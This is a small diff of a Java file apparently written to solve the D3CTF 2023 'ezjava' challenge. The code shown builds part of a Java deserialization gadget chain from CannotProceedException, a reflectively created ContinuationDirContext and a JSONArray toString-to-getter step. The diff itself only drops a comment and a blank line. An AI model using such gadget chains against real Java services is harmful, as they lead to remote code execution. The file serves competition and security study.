@@ -17,14 +17,12 @@ import java.io.ByteArrayInputStream;
 import java.util.Hashtable;
 public class D3CTF2023Ezjava {
     public static void main(String[] args) throws Exception {
-//
         CannotProceedException cpe = ReflectUtils.createWithoutConstructor(CannotProceedException.class);
         cpe.setResolvedObj(new TestUtils());
         Object ctx = ReflectUtils.newInstance(
                 "javax.naming.spi.ContinuationDirContext",
                 cpe, new Hashtable<>()
         );
-
 
         // toString2Getter
         JSONArray jsonArray = new JSONArray();
